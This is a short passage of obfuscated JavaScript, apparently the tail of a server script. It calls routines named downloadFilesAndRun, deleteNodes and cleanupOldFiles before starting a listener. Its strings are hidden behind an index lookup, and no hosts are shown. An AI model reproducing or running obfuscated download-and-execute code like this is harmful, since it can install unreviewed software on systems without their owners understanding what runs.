_0x51d026=_0x336541[_0x238491];return _0x51d026;}async function startserver(){const _0x2d2b87=_0x52a670;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2d83fc){console[_0x2d2b87(0x1c8)](_0x2d2b87(0x20b),_0x2d83fc);}}startserver()[_0x52a670(0x23c)](_0x1d3406=>{const _0x42a89f=_0x52a670;console[_0x42a89f(0x1c8)](_0x42a89f(0x1ad),_0x1d3406);}),app[_0x52a670(0x193)](PORT,()=>console[_0x52a670(0x17a)](_0x52a670(0x1ae)+PORT+'!'));
